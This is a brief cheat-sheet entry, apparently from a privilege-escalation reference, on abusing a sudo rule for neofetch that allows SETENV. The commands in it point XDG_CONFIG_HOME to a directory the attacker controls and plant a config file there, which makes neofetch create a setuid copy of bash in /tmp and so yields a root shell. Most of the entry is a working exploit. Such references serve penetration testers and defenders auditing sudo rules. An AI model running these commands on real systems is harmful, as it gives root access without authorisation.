# neofetch XDG_CONFIG_HOME Privesc

If `neofetch` can be run via `sudo` and the `SETENV` tag is allowed (or environment is passed through), set `XDG_CONFIG_HOME` to a directory you control. neofetch sources `$XDG_CONFIG_HOME/neofetch/config.conf` as a shell script.

```bash
sudo -l
# (root) SETENV: NOPASSWD: /usr/bin/neofetch

mkdir -p /tmp/nf/neofetch
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > /tmp/nf/neofetch/config.conf

sudo XDG_CONFIG_HOME=/tmp/nf neofetch
/tmp/b -p
```
